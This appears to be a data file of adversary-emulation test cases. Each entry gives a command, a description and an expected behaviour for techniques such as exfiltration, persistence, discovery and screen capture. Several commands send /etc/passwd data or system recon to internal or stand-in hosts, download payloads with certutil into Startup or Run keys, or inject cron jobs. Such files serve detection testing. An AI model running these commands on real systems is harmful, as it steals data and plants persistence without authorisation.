attacks.command: tar -czf /tmp/system_snapshot.tar.gz /etc/passwd /etc/group 2>/dev/null && curl -X POST http://192.168.0.10:8080/upload -H 'Content-Type: application/gzip' --data-binary @/tmp/system_snapshot.tar.gz && rm /tmp/system_snapshot.tar.gz 2>/dev/null || true
attacks.description: Intermediate exfiltration: archives sensitive system files and uploads the compressed data
attacks.expected_behavior: Creates a gzipped tar archive of common system files, uploads it via HTTP POST with appropriate content-type, then attempts to remove the local file. Errors during cleanup are ignored.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: echo 'hostname=$(hostname); ips=$(ip a); users=$(cut -d: -f1 /etc/passwd)' > /tmp/env_data.sh && chmod +x /tmp/env_data.sh && /tmp/env_data.sh > /tmp/report.txt 2>/dev/null && base64 /tmp/report.txt > /tmp/b64_out.txt && curl -X POST http://192.168.0.10:8080/exfil -d @/tmp/b64_out.txt && rm /tmp/env_data.sh /tmp/report.txt /tmp/b64_out.txt 2>/dev/null || true
attacks.description: Advanced exfiltration: collects system information, encodes it in base64, and sends to C2 server
attacks.expected_behavior: Generates a script to collect basic system info, executes it, encodes output in base64, sends via HTTP POST as form data, then cleans up local files. Cleanup errors are ignored.

attacks.command: cmd.exe /c echo Running system check... & whoami & ipconfig /flushdns
attacks.description: Basic command execution using native Windows binaries to simulate benign payload activity
attacks.expected_behavior: Prints 'Running system check...', current user context, and flushes DNS cache. All actions use built-in tools and are non-persistent.

attacks.description: Intermediate: Download a text file masquerading as an update and execute it via cmd
attacks.expected_behavior: Attempts to download payload.txt to %TEMP%\update.bat using certutil; then executes it. The file is benign (e.g., contains 'echo update applied'). No actual malware is transferred.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c calc.exe'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { }"
attacks.description: Advanced: Execute encoded command in hidden window to simulate stealthy payload execution
attacks.expected_behavior: Encodes 'cmd.exe /c calc.exe' in Base64 (UTF-16LE), then spawns a hidden PowerShell process to run it. Calculator opens without visible console. Simulates obfuscated execution commonly seen in backdoors.

attacks.description: Basic execution of a command chain using bash to simulate payload execution.
attacks.expected_behavior: Prints a message and sleeps for 5 seconds. Simulates simple command execution via native shell.

attacks.description: Intermediate: Write a hidden script to /tmp, make it executable, and run it.
attacks.expected_behavior: Creates a hidden shell script in /tmp, sets execute permission, and runs it. Outputs execution message.

attacks.description: Advanced: Decode a base64-encoded script to disk and execute it, simulating stealthy payload delivery.
attacks.expected_behavior: Decodes a base64 string into a script file, makes it executable, and runs it. Outputs a benign message.

attacks.description: Create an encrypted file using PowerShell
attacks.expected_behavior: An encrypted file is created in the temp directory

attacks.description: Encode the encrypted file using certutil
attacks.expected_behavior: The encrypted file is encoded and saved as a new file

attacks.description: Simulate exfiltration by copying the encoded file to a new location
attacks.expected_behavior: The encoded file is copied to a new location, simulating exfiltration

attacks.description: Encrypt a test file using AES-256-CBC
attacks.expected_behavior: The test file will be encrypted and saved as test.enc

attacks.description: Encrypt a test file using AES-256-CBC with a password
attacks.expected_behavior: The test file will be encrypted with a password and saved as test.enc

attacks.command: bash -c 'openssl enc -aes-256-cbc -in test.txt -out test.enc; scp test.enc user@remote-server:/remote/path'
attacks.description: Encrypt a test file and exfiltrate it using SCP
attacks.expected_behavior: The test file will be encrypted and exfiltrated to a remote server

attacks.description: Basic remote command execution via SSH to demonstrate lateral movement.
attacks.expected_behavior: Establishes an SSH connection to the target host and runs an echo command, confirming that remote execution succeeded.

attacks.command: ssh -o StrictHostKeyChecking=no user@192.168.1.10 "mkdir -p /tmp/remote && echo 'echo \"remote payload executed\"' > /tmp/remote/payload.sh && chmod +x /tmp/remote/payload.sh && /tmp/remote/payload.sh &"
attacks.description: Intermediate SSH usage that copies a benign script to the remote host, makes it executable, and runs it in the background.
attacks.expected_behavior: Creates /tmp/remote/payload.sh on the remote system, writes a harmless echo command into it, marks it executable, and launches it, resulting in a background process that prints a test message.

attacks.description: Advanced use of systemd to start a transient service that attempts a TCP connection to a remote listener, simulating a reverse‑shell style lateral movement.
attacks.expected_behavior: Creates a transient systemd service named remote-test.service which runs netcat to connect to 192.168.1.20 on port 4444; the connection attempt is harmless and can be observed with netstat or systemd status.

attacks.description: Remove a specific file without prompting for confirmation
attacks.expected_behavior: The specified file will be deleted if it exists and the user has permission to delete it.

attacks.description: Remove a file and suppress error messages
attacks.expected_behavior: The file will be deleted if it exists, and any error messages (e.g., if the file does not exist) will be suppressed.

attacks.description: Lists all open application windows with their IDs, desktop numbers, and titles.
attacks.expected_behavior: Outputs a line per window in the format: <window-id> <desktop> <host> <window-title>.

attacks.description: Displays the full window tree of the X server, showing each window's ID, geometry, and name.
attacks.expected_behavior: Prints a hierarchical list of all windows, starting from the root window, with details such as window ID, size, position, and title.

attacks.description: Searches for all currently visible windows and returns their window IDs.
attacks.expected_behavior: Outputs a list of window IDs, one per line, representing each visible application window.

attacks.description: Ping a specific IP address to check if it is active
attacks.expected_behavior: The command will send an ICMP echo request to the specified IP address and display the response.

attacks.description: Ping a range of IP addresses to check for active hosts
attacks.expected_behavior: The command will send ICMP echo requests to the specified range of IP addresses and display the responses.

attacks.command: for i in {1..10}; do ping -c 1 192.168.1.$i; done
attacks.description: Use a script to ping multiple IP addresses
attacks.expected_behavior: The command will send ICMP echo requests to the specified range of IP addresses and display the responses.

attacks.description: Download a benign test file from a public URL using certutil and launch it with the default associated application.
attacks.expected_behavior: certutil retrieves the file and stores it in the temporary directory; the start command opens the file (e.g., Notepad) without affecting system stability.

attacks.command: certutil -urlcache -split -f "http://example.com/payload.exe" "%TEMP%\payload.exe" && copy "%TEMP%\payload.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe" && reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Payload" /t REG_SZ /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe" /f
attacks.description: Simulate exploitation by downloading a payload, placing it in the user's Startup folder, and adding a HKCU Run registry entry for persistence.
attacks.expected_behavior: The payload is downloaded to %TEMP%, copied to the user's Startup directory, and a Run key is created under HKCU so the file would execute on each logon. No admin rights are required.

attacks.command: certutil -urlcache -split -f "http://example.com/service.exe" "%TEMP%\service.exe" && sc create EvilService binPath= "%TEMP%\service.exe" start= auto && sc start EvilService
attacks.description: Download a service binary and install it as a Windows service to achieve persistence and run with system privileges.
attacks.expected_behavior: The executable is fetched to %TEMP%, a new service named EvilService is created pointing to that binary, and the service is started. This requires administrative rights and demonstrates a typical post‑exploitation persistence mechanism.

attacks.description: Basic exploit attempt using curl to send a GET request with an exploit parameter
attacks.expected_behavior: The command attempts to exploit a vulnerability in a public-facing web application by sending a crafted GET request.

attacks.description: Intermediate exploit attempt using wget to send a POST request with exploit data
attacks.expected_behavior: The command tries to exploit a vulnerability by sending a POST request with exploit data to a public-facing web application.

attacks.description: Advanced exploit attempt using curl to send a JSON payload with an exploit parameter
attacks.expected_behavior: The command attempts a sophisticated exploit by sending a JSON payload with an exploit parameter to a public-facing web application.

attacks.description: Basic example of archiving collected data using tar
attacks.expected_behavior: Creates a compressed archive of the specified data

attacks.description: Intermediate example using zip for archiving
attacks.expected_behavior: Creates an archive of the specified data using zip

attacks.description: Advanced example using 7z for archiving with compression
attacks.expected_behavior: Creates a highly compressed archive of the specified data using 7z

attacks.description: Creates a user‑level scheduled task that runs at system start and writes a test string to a temporary file.
attacks.expected_behavior: A task named 'TestTask' appears in Task Scheduler; on the next boot it runs and creates %TEMP%\task_output.txt containing 'ScheduledTaskTest'.

attacks.command: schtasks /Create /SC ONCE /ST 23:59 /SD 12/31/2099 /TN "HiddenPS" /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"'Hidden task executed' | Out-File -FilePath $env:TEMP\\hidden_output.txt\"" /RL HIGHEST
attacks.description: Creates a one‑time task that runs a hidden PowerShell command, writing output to a temp file; requires highest run level.
attacks.expected_behavior: A task named 'HiddenPS' is scheduled for 23:59 on 12/31/2099; when triggered it runs PowerShell silently and creates %TEMP%\hidden_output.txt with the test string.

attacks.description: Creates a startup task that runs under the SYSTEM account and writes a test string to the system Temp folder.
attacks.expected_behavior: A task named 'SystemTask' appears in Task Scheduler; at system start it runs as SYSTEM and creates %SYSTEMROOT%\Temp\system_task.txt containing 'SystemTask'.

attacks.description: Open the cron table for editing to add a new scheduled task
attacks.expected_behavior: Opens the cron table in the default editor, allowing the user to add a new cron job.

attacks.description: List all scheduled tasks in the cron table
attacks.expected_behavior: Displays all cron jobs scheduled for the current user.

attacks.description: Remove all scheduled tasks from the cron table
attacks.expected_behavior: Deletes all cron jobs for the current user. Use with caution as it removes all scheduled tasks.

attacks.description: Read the /etc/passwd file to list all user accounts and their associated UID/GID information.
attacks.expected_behavior: Outputs the contents of /etc/passwd, showing one line per account with fields separated by colons (username, password placeholder, UID, GID, comment, home directory, shell).

attacks.description: Query the system's NSS database for passwd entries, which enumerates local and network‑based user accounts.
attacks.expected_behavior: Prints a list of passwd entries similar to /etc/passwd, but sourced via NSS; each line includes username, password placeholder, UID, GID, comment, home directory, and shell.

attacks.description: Extract usernames from the /etc/shadow file, which stores hashed passwords and is readable only by root.
attacks.expected_behavior: Outputs a list of usernames (the first field) from /etc/shadow. Execution will fail with a permission error if not run as root.

attacks.description: Starts Problem Steps Recorder to capture a screenshot and saves the output ZIP file to the TEMP directory, then stops after a short delay
attacks.expected_behavior: A ZIP file containing a screenshot of the current desktop is created at %TEMP%\psr_capture.zip

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $path = $env:TEMP + '\\screenshot.png'; $bmp.Save($path); Write-Host 'Saved screenshot to ' + $path"
attacks.description: Captures the primary screen to a PNG file in the TEMP directory using PowerShell and .NET drawing classes
attacks.expected_behavior: A PNG image named screenshot.png is saved in the %TEMP% folder representing the current screen contents

attacks.command: powershell -Command "$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $path = $env:TEMP + '\\adv_screenshot.png'; $bmp.Save($path); $zip = $env:TEMP + '\\adv_screenshot.zip'; Compress-Archive -Path $path -DestinationPath $zip -Force; Write-Host 'Screenshot saved and archived'"
attacks.description: Advanced capture that saves a screenshot to a PNG file and then compresses it into a ZIP archive in the TEMP directory
attacks.expected_behavior: Creates adv_screenshot.png and adv_screenshot.zip in %TEMP%; the ZIP contains the captured screenshot image

attacks.description: Capture the entire screen using scrot
attacks.expected_behavior: A screenshot will be captured and saved to the default location

attacks.description: Capture the entire screen and save to a file using scrot
attacks.expected_behavior: A screenshot will be captured and saved to the specified file

attacks.description: Capture a specific region of the screen and save to a file using scrot
attacks.expected_behavior: A screenshot of the selected region will be captured and saved to the specified file

attacks.description: Appends a malicious command to the user's bashrc file to execute upon shell login.
attacks.expected_behavior: The command will be executed when the user logs in.

attacks.command: sudo crontab -l | { cat; echo '* * * * * malicious_command'; } | sudo crontab -
attacks.description: Modifies the system cron table to execute a malicious command at regular intervals, requiring admin privileges.
attacks.expected_behavior: The malicious command will be executed by the cron daemon at the specified intervals.

attacks.description: Appends a malicious command to the system's rc.local file to execute upon system startup, requiring admin privileges.
attacks.expected_behavior: The malicious command will be executed during system boot.

attacks.description: Creates a simple bash script in /tmp, marks it executable, and runs it, emulating a user executing a malicious file.
attacks.expected_behavior: The script prints "Malicious payload executed" to the console and exits.

attacks.description: Drops a script with a .png extension to trick the user, then executes it via bash, demonstrating disguised malicious files.
attacks.expected_behavior: The script prints "Executed disguised script" to the console and exits.

attacks.description: Copies a benign system binary to a new location to simulate a dropped malicious executable and runs it.
attacks.expected_behavior: The copied binary executes and exits with a success status (no visible output).

attacks.command: sudo bash -c 'echo -e \"#!/bin/bash\\necho Privileged malicious script executed\\n\" > /usr/local/bin/malicious && chmod +x /usr/local/bin/malicious' && sudo /usr/local/bin/malicious
attacks.description: Creates a script in a system directory that requires root privileges, then executes it with sudo, representing a privileged user executing a malicious file.
attacks.expected_behavior: The script prints "Privileged malicious script executed" to the console and exits.
